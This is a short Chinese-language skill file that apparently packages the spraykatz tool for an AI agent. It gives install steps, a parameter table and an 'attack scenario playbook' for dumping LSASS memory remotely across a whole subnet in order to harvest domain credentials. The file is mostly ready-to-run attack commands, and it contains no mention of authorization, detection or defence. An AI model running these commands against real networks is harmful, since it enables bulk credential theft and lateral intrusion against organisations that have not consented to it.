---
name: spraykatz-credentials
description: 渗透工具 skill:spraykatz 的安装、参数速查与攻击场景 playbook。当任务涉及 内存转储与LSASS窃取 需要调用 spraykatz 时使用。
---

# spraykatz

- 攻击大类:C24 内存转储与LSASS窃取
- 上游仓库:https://github.com/aas-n/spraykatz
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/aas-n/spraykatz && cd spraykatz && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python3 spraykatz.py -u admin -p pass -t 10.0.0.0/24` | 远程凭据收割 |
| `-t cidr -u u -p p` | 凭据 |
| `-w` | wordlist |

## 攻击场景 Playbook

### 域内远程 mimikatz

```bash
python3 spraykatz.py -u svc -p pass -t 10.0.0.0/24
# 批量远程 lsass dump
```

## 注意事项

远程批量 mimikatz。
